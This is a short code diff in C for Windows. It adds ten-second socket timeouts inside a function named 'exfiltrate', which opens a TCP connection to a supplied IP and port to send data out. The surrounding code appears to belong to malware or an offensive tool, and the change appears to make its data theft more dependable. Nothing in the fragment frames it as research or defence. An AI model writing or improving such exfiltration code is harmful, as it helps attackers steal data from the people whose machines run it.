@@ -19,6 +19,11 @@ static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
     SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
 
+    // Set socket timeouts (10s) to prevent indefinite blocking
+    DWORD timeout_ms = 10000;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
+
     struct sockaddr_in addr;
     ZeroMemory(&addr, sizeof(addr));
     addr.sin_family = AF_INET;
